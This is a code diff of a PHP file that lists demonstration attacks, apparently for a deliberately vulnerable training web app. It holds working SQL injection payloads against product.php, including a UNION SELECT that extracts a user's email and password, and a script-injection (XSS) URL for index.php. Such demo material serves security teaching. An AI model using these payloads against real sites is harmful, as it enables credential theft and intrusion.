@@ -7,15 +7,15 @@ $attacks = array();
 $attacks[0] = array(
     "name" => "SQL Injection",
     "description" => "Show value of item 2 instead of nothing",
-    "value" => "0' OR id=2 --",
+    "value" => "product.php?id=0' OR id=2 --",
     "attack" => "product.php?id=0'%20OR%20id=2--"
 ); 
 
 $attacks[1] = array(
     "name" => "SQL Injection",
     "description" => "Show email and password for a user with id 1",
-    "value" => "0' UNION SELECT 'bla', email as name, pw as description, 'bla', 'bla','bla' FROM users WHERE id=1 --",
-    "attack" => "product.php?id=0'%20UNION%20SELECT%20'bla',%20email%20as%20name,%20pw%20as%20description,%20'bla',%20'bla','bla'%20FROM%20users%20WHERE%20id=1%20%20--");
+    "value" => "product.php?id=0' UNION SELECT 'bla', email as name, pw as description, 'bla' FROM users WHERE id=1 --",
+    "attack" => "product.php?id=0%27%20UNION%20SELECT%20%27bla%27,%20email%20as%20name,%20pw%20as%20description,%20%27bla%27%20FROM%20users%20WHERE%20id=1%20%20--");
 
 $xss = '
 var buffer = [];
@@ -57,8 +57,6 @@ $attacks[3] = array(
     "attack" => "index.php?message=<script>".$xss."</script>"
 );
 
-echo "<script>".$xss."</script>";
-
 ?>
 
 <?php
@@ -90,5 +88,3 @@ include_once("header.php");
 <?php 
 include_once("footer.php");
 ?>
-
-
